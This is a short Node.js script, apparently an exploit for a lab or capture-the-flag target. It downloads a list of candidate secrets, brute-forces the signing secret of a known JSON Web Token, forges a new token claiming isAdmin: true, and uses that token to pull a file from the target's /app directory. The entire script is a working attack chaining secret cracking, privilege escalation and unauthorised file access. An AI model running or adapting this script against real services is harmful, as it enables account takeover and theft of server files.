const jwt = require('jsonwebtoken');
const axios = require('axios');
const utils = require("./utils");
const config = require('./config');

(async () => {
    const {data} = await axios.get(config.secretsUrl);
    const secrets = data.split('\n').filter((secret) => secret.length > 0);

    let realSecret = '';
    for(const secret of secrets) {
        try {
            jwt.verify(config.baseToken, secret, { algorithms: [ config.jwtAlgorithm ] });

            realSecret = secret;
            break;
        } catch (e) {

        }
    }

    const newToken = jwt.sign({ isAdmin: true }, realSecret, { algorithm: config.jwtAlgorithm, noTimestamp: true });

    const { data: { fileContents } } = await axios.get(config.downloadFileUrl, {
        headers: {
            Authorization: `Bearer ${newToken}`
        },
        params: {
            path: `/app/${config.fileName}`
        }
    });

    const result = await utils.contentToFile(fileContents, config.fileName);

    console.log(`File downloaded to ${result}`)
})();